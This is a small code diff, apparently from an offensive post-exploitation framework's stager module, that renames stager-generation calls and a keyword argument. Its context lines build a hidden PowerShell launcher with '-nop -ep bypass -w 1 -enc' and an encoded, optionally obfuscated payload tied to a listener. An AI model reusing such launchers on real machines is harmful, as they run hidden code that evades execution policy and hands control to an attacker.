@@ -128,7 +128,7 @@ class Stager:
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {launcher_ps}"
 
             else:
-                oneliner = self.mainMenu.stagers.generate_exe_oneliner(
+                oneliner = self.mainMenu.stagergenv2.generate_exe_oneliner(
                     language=language,
                     obfuscate=obfuscate,
                     obfuscation_command=obfuscate_command,
@@ -138,8 +138,8 @@ class Stager:
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
 
         elif language == "powershell":
-            launcher = self.mainMenu.stagers.generate_launcher(
-                listenerName=listener_name,
+            launcher = self.mainMenu.stagergenv2.generate_launcher(
+                listener_name=listener_name,
                 language="powershell",
                 encode=True,
                 obfuscate=obfuscate,
